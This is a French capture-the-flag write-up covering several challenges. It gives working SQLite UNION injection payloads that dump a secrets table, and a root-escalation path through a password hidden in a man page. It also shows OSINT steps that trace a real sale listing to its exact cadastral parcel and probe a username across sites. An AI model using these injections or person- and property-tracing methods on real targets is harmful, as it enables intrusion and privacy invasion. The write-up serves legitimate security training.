# Write-up — CyberNight 2026 (CTFREI)

Auteur : Clément Berton

| Challenge | Catégorie | Points | Difficulté | Statut |
|---|---|---|---|---|
| Alien Hatch 1 — Indigestion | Web | 500 | Easy | Résolu (payload) |
| Peindre l'espoir | OSINT | 495 | Easy | En cours (flag à valider) |
| RTFM | System | 427 | Easy | En cours (dernière étape) |
| Le lundi au soleil ! | OSINT | 493 | Medium | Flaggé |
| Hell Yeahhhh ! 🤘 | OSINT | 500 | Hard | Non flaggé |

---

## Alien Hatch 1 — Indigestion (Web, Easy)

**Cible :** `http://<instance>.challenges.cybn.fr:8000` — jeu « Alien Hatch ». Le champ « Nourrir Zorglub » envoie un `POST /feed` avec le paramètre `food`.

### Reconnaissance
- `'` → `unrecognized token: "'''"` : erreur **SQLite**, l'entrée est injectée dans une requête. Le paramètre est concaténé dans :
  `SELECT name, calories, yumminess FROM foods WHERE name = '<food>'`
- Piège : le message « Zorglub renifle … et refuse d'y toucher » (status `unknown`) ne signifie **pas** un filtre/WAF, mais simplement **0 ligne renvoyée**. Aucune blacklist.
- `' OR '1'='1` → renvoie les 6 aliments (statut `ok`, tableau `digested`).

### Exploitation (UNION-based)
- Nombre de colonnes : `' UNION SELECT 1,2,3-- ` → OK (3 colonnes, la 1re = `name` est affichée).
- Tables :
  `' UNION SELECT group_concat(name,' | '),1,1 FROM sqlite_master WHERE type='table'-- `
  → `foods | secrets`
- Schéma :
  `' UNION SELECT group_concat(sql,'  ||  '),1,1 FROM sqlite_master WHERE type='table'-- `
  → `foods(id, name, calories, yumminess)` et **`secrets(id, label, value)`**

### Flag
```
' UNION SELECT value,1,1 FROM secrets-- 
```
Le flag s'affiche dans le journal (`↳ digéré : CYBN{...}`), lu depuis `secrets.value`.

**Leçon :** vérifier un vrai `UNION SELECT` complet avant de conclure à un filtre ; lire la réponse JSON brute (`digested`) plutôt que l'interface, qui n'affiche qu'une partie des champs.

---

## RTFM (System, Easy)

**Accès :** `ssh cybn@challenges.cybn.fr -p 10068` (mot de passe `cybn`). But : utiliser la bibliothèque `libgetflag`.

### Lecture du manuel
- `man 3 get_flag` :
  - `#include <get_flag.h>`
  - `int get_flag(const char *password, char *buf, size_t len);` — lib `-lgetflag`
  - Si le mot de passe est correct, la fonction écrit le **mot de passe root** dans `buf`. Le flag est dans `/root/flag.txt`. Mot de passe non documenté ici → voir `get_flag(7)`.
- `man 7 get_flag` : n'affiche pas le mot de passe, mais enseigne la recherche (`man -K`, `man -k`, `man -w`, pages brutes roff).
- `man 5 getflag.conf` → **BOGUES : « Cette page en sait plus qu'elle n'en affiche. »**
- `man 1 get_flag` → « ce que vous voyez à l'écran n'est pas le contenu exact du fichier » (source **roff** compressée en `.gz`).

### Mot de passe (source vs rendu)
```
man -w 5 getflag.conf
# → /usr/local/man/man5/getflag.conf.5.gz
zcat "$(man -w 5 getflag.conf)" | grep -iE 'pass|changeme|\.\\"'
```
Dans un commentaire roff `.\"` (non affiché par `man`) :
```
.\" Mot de passe de get_flag(3) : gf_r34d_th3_s0urc3_n0t_th3_r3nd3r
```

### Programme
```c
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <get_flag.h>

int main(void) {
    char buf[128];
    if (get_flag("gf_r34d_th3_s0urc3_n0t_th3_r3nd3r", buf, sizeof(buf)) == -1) {
        fprintf(stderr, "get_flag: %s\n", strerror(errno));
        return EXIT_FAILURE;
    }
    printf("%s\n", buf);     // affiche le mot de passe root
    return EXIT_SUCCESS;
}
```
```
gcc -o solve solve.c -lgetflag
./solve                      # => mot de passe root
su -                         # coller le mot de passe affiché par ./solve
cat /root/flag.txt           # => flag
```

**Leçon :** le fichier source d'une page de manuel (roff) contient des commentaires `.\"` que le rendu masque ; `man -w` + `zcat` donnent le brut. Ne pas confondre l'argument de `get_flag()` (mot de passe d'entrée) et sa sortie (mot de passe root).

---

## Peindre l'espoir (OSINT, Easy)

**Énoncé :** métaphore d'une « guerre sans balle, toutes les nations, le monde pour toile » (= street art), un artiste italien, un portrait de femme près d'un village ; repères : *Trattoria Picaló* et *Bar Vittoria*. Format `CYBN{Prénom_Nom}`.

### Démarche
1. **Géolocalisation** par les commerces : la *Trattoria Picalò* est à **Spongano** (province de Lecce, Salento, Pouilles), **Piazza Vittoria** — même place que le *Bar Vittoria*. → village = Spongano.
2. **Œuvre** : grande fresque de **Leticia Mandragora** (style monochrome bleu), au début de la **via Grazia Deledda**, à l'angle de la **via Fra Ignazio**.
3. **Sujet** : portrait de **Grazia Deledda**, écrivaine, **prix Nobel de littérature 1926** (seule Italienne lauréate). La rue de la fresque porte son nom.

### Flag
Nom complet de l'écrivaine, format `CYBN{Prénom_Nom}`.
- `CYBN{Grazia_Deledda}` → refusé.
- Piste restante (l'énoncé insiste sur le nom **complet**) : nom de naissance entier
  `CYBN{Grazia_Maria_Cosima_Damiana_Deledda}` — *à valider*.

**Leçon :** trianguler une localisation via des noms de commerces, puis remonter œuvre → artiste → sujet. Attention aux œuvres homonymes de l'artiste dans d'autres villes.

---

## Le lundi au soleil ! (OSINT, Medium)

### Énoncé
Une seule photo, prise depuis le salon d'une maison en vente, vers le jardin où doit être construite une piscine. Il faut retrouver la référence cadastrale de la parcelle.

Format : `CYBN{940760000Y0364}`, soit l'identifiant de parcelle sur 14 caractères :

| Code INSEE | Préfixe | Section | Numéro |
|---|---|---|---|
| `94076` | `000` | `0Y` | `0364` |

### 1. Retrouver l'annonce
La photo montre une ville en contrebas : toits de tuiles, une flèche d'église très fine, des collines boisées à l'horizon. L'annonce de vente existe toujours.

Recherche par image inversée (Google Lens) → annonce Safti n°1729071 :
`https://www.safti.fr/annonces/achat/maison/agen-47000/1729071`

Infos utiles :
- Agen (47000), « nichée sur les très prisés coteaux de l'Ermitage » ;
- terrain de **354 m²** ;
- vue « sur la ville et son canal » ;
- maison de 1948, 77 m², toit-terrasse.

### 2. Filtrer le cadastre par surface
Cadastre en open data (Etalab), une archive GeoJSON par commune. Agen = INSEE `47001`.

```bash
curl -sL -o agen.json.gz \
  https://cadastre.data.gouv.fr/data/etalab-cadastre/latest/geojson/communes/47/47001/cadastre-47001-parcelles.json.gz
```

Chaque parcelle a un champ `contenance` (surface cadastrale en m²). Je garde celles de 354 m² :

```python
import gzip, json
fs = json.load(gzip.open('agen.json.gz'))['features']
for f in fs:
    if f['properties']['contenance'] == 354:
        print(f['properties']['id'])
```

10 parcelles sur 12 319. Une seule sur les coteaux de l'Ermitage, au nord-ouest du centre : **`47001000BO0060`**.

### 3. Vérification
Superposition des contours de parcelles sur l'orthophoto IGN (`data.geopf.fr`, couche `ORTHOIMAGERY.ORTHOPHOTOS`) :
- BO 60 est une parcelle en pente avec une maison et un jardin ;
- elle domine le canal latéral à la Garonne, avec la ville derrière.

Correspond à l'annonce et à l'orientation de la photo.

### Flag
```
CYBN{47001000BO0060}
```

---

## Hell Yeahhhh ! 🤘 (OSINT, Hard)

### Énoncé
Un intrus s'est introduit sur le serveur de la CyberNight. On l'a croisé à un concert, où il a pris une photo de son visage. Il faut retrouver cette photo, la chanson qu'il écoutait à ce moment-là et le bloc où il était assis.

Format : `CYBN{B12_Bohemian-Rhapsody}`

### 1. L'intrus
Dans la liste des membres du Discord CyberNight : un compte affiché **SergeyMetal**, nom d'utilisateur `sergeymetal`. Le profil ne s'ouvre pas directement.

J'ai testé le pseudo sur plusieurs plateformes via les codes HTTP. Pas de compte sur GitHub, SoundCloud, Flickr ni Linktree. Les autres réponses ne sont pas concluantes (beaucoup de sites renvoient 200 même pour un pseudo inexistant).

### 2. La photo
Photo retrouvée : un selfie en tribune, avec un encart montrant la scène, légendé « Best concert ever ! Il est que 21h23 et c'est déjà le feu ». Le fichier ne contient plus de métadonnées EXIF.

> Source de la photo : [à compléter]

Indices :
- l'encart montre la toiture ovale suspendue et les mâts du **Stade de France** ;
- public en t-shirts rock/métal. Le t-shirt « Final F*cked Up Tour » est du merch Shaka Ponk, mais le groupe n'a jamais joué au Stade de France (tournée d'adieu terminée à l'Accor Arena en novembre 2024) : c'est juste un fan ;
- ciel encore clair au coucher du soleil, donc en début d'été.

Concert retenu : **System of a Down au Stade de France**, joué deux soirs, le **2 juillet** et le **4 juillet 2026**. Écartés ou moins probables : Linkin Park (11/07/2025, scène centrale), AC/DC (9 et 13/08/2025).

### 3. La chanson à 21h23
Horaires de début relevés sur setlist.fm, confirmés pour le 2 juillet par le compte rendu de Sortiraparis (lumières éteintes à 21h10). Calcul par la durée des morceaux, à quelques dizaines de secondes près.

| Soir | Début | Setlist jusqu'à 21h23 | Candidat |
|---|---|---|---|
| 2 juillet | 21h10 | X → Prison Song → Violent Pornography → **Mr. Jack** (~21h20–21h25) | `Mr-Jack` |
| 4 juillet | 21h05 | Soldier Side (intro) → B.Y.O.B. → Suite-Pee → Chic 'N' Stu → Prison Song → **Aerials** (~21h20–21h24) | `Aerials` |

Ni la presse ni la météo ne permettent de savoir quel soir. La date du post d'origine trancherait.

### 4. Le bloc
Visualiseur 3D officiel du Stade de France, « Où est ma place ? », configuration concert (scène en bout de stade) :
`https://pacifaprod.s3.amazonaws.com/StadeDeFranceSAINTDENIS/WIMS_CSDF/v2019-2020/iframe.html?l=fr`

Les données du visualiseur (`c/w/blocks.json`, `c/w/<bloc>.json`, `c/topviewblocks.json`) donnent la liste des blocs, au format lettre + chiffre comme dans le flag. Tribune basse = rangs 1 à 30, tribune intermédiaire = rangs 35 à 59.

Ce que montre l'encart :
- scène devant à droite, tribune d'en face vers la gauche, tribune du photographe qui s'incurve vers lui à droite : **grand côté**, **moitié du stade opposée à la scène** ;
- lueur du coucher de soleil (nord-ouest en juillet) sous le toit en face : **tribune Est**, scène au nord ;
- pelouse vue en grand, foule juste devant : **tribune basse**.

Comparaison avec les vues du visualiseur :

| Bloc | Résultat |
|---|---|
| D4, D5 | Trop près de la scène |
| D1, D2 | Angle très proche, scène un peu plus grande que sur l'encart |
| B8 | Scène plus petite et plus lointaine, rambarde dans le champ |

Candidats retenus : D2, D1, B8. La maquette 3D date de 2019-2020 avec une scène générique, donc comparaison de taille approximative.

### Statut
Non flaggé. Combinaisons candidates :

```
CYBN{D2_Mr-Jack}   CYBN{D2_Aerials}
CYBN{D1_Mr-Jack}   CYBN{D1_Aerials}
CYBN{B8_Mr-Jack}   CYBN{B8_Aerials}
```

Il reste à retrouver la date du post d'origine pour fixer la chanson, puis à départager les blocs.
